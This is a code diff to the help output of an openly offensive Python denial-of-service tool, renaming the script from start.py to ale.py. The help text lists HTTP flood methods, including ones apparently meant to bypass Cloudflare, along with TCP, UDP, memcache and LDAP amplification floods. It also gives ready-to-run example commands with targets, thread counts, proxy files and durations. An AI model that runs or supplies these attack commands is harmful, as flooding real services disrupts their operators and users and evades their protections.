@@ -873,7 +873,7 @@ class ToolsConsole:
     def print_help():
         help_text = f"""
 {c('USAGE:', Fore.YELLOW)}
-    python3 start.py <method> <target> <socks_type> <threads> <proxyfile> <rpc> <duration>
+    python3 ale.py <method> <target> <socks_type> <threads> <proxyfile> <rpc> <duration>
 
 {c('LAYER 7 METHODS (HTTP/HTTPS):', Fore.GREEN)}
     bypass, cf-bypass, http-get, http-post, http-head, http-options,
@@ -889,11 +889,11 @@ class ToolsConsole:
     memcache-flood, ldap-flood, portmap-flood, siege, quake-flood
 
 {c('EXAMPLES:', Fore.CYAN)}
-    python3 start.py bypass https://example.com 5 500 auto 100 120
-    python3 start.py http-get https://example.com 5 200 socks5.txt 50 60
-    python3 start.py cf-bypass https://target.com 5 1000 auto 100 180
-    python3 start.py tcp-flood 192.168.1.100:80 5 5000 auto 300
-    python3 start.py udp-flood example.com:53 5 10000 auto 120
+    python3 ale.py bypass https://example.com 5 500 auto 100 120
+    python3 ale.py http-get https://example.com 5 200 socks5.txt 50 60
+    python3 ale.py cf-bypass https://target.com 5 1000 auto 100 180
+    python3 ale.py tcp-flood 192.168.1.100:80 5 5000 auto 300
+    python3 ale.py udp-flood example.com:53 5 10000 auto 120
 
 {c('ARGUMENTS:', Fore.MAGENTA)}
     method      - Attack method from the lists above
